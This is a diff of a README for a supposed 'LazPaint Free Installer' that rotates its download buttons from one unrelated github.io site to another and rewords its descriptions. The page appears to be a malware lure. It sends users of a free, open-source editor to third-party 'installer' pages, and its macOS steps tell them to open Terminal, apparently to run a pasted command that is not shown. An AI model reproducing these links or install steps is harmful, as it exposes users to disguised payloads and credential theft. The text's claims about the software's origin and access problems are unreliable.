@@ -8,7 +8,7 @@
   <img src="https://img.shields.io/badge/Category-Image+Editor-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 LazPaint Free Installer** — LazPaint is a free, open-source image editor for Windows, macOS, and Linux written in Lazarus/Pascal. Works without internet access, no account required. Full offline installation.
+**💻 LazPaint Free Installer** — LazPaint is a free, cross-platform image editor written in Free Pascal. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install LazPaint](https://img.shields.io/badge/⬇_Install_LazPaint-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install LazPaint](https://img.shields.io/badge/⬇_Install_LazPaint-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About LazPaint
 
-LazPaint is a free, open-source image editor for Windows, macOS, and Linux written in Lazarus/Pascal. Features include layers, selection tools, filters, drawing tools, and support for PNG, BMP, GIF, JPEG, and other formats. LazPaint is a lightweight alternative to GIMP for users who need basic image editing without the complexity of professional tools.
+LazPaint is a free, cross-platform image editor written in Free Pascal. It provides basic photo editing tools, layer support, smart zoom, and a scripting interface — offering a lightweight alternative to GIMP for simple image editing tasks.
 
 ---
 
 ## ❌ Problem: LazPaint is hard to access
 
-- **Feature Set** — Less comprehensive than GIMP or Photoshop for complex editing
-- **Community Size** — Small community with limited tutorials and resources
-- **Plugin Ecosystem** — Very limited extension system
-- **UI Design** — Dated visual design compared to modern image editors
+- **Limited Feature Set** — Missing many advanced features of GIMP or Photoshop
+- **Small Community** — Limited tutorials and resources compared to major image editors
+- **Interface Style** — UI less polished than modern image editing software
+- **Plugin Ecosystem** — Very small extension library
 
 ---
 
@@ -61,9 +61,9 @@ LazPaint is a free, open-source image editor for Windows, macOS, and Linux writt
 
 <div align="center">
 
-[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 </div>
 
@@ -81,7 +81,7 @@ LazPaint is a free, open-source image editor for Windows, macOS, and Linux writt
 
 <div align="center">
 
-[![⬇ Install LazPaint](https://img.shields.io/badge/⬇_Install_LazPaint-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install LazPaint](https://img.shields.io/badge/⬇_Install_LazPaint-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -100,7 +100,7 @@ LazPaint is a free, open-source image editor for Windows, macOS, and Linux writt
 
 ## 🍎 macOS Installation
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -121,11 +121,11 @@ LazPaint is a free, open-source image editor for Windows, macOS, and Linux writt
 
 ---
 
-**LazPaint Free Installer** — LazPaint is a free, open-source image editor for Windows, macOS, and Linux written in Lazarus/Pascal. Install without internet connection today!
+**LazPaint Free Installer** — LazPaint is a free, cross-platform image editor written in Free Pascal. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install LazPaint](https://img.shields.io/badge/⬇_Install_LazPaint-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install LazPaint](https://img.shields.io/badge/⬇_Install_LazPaint-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
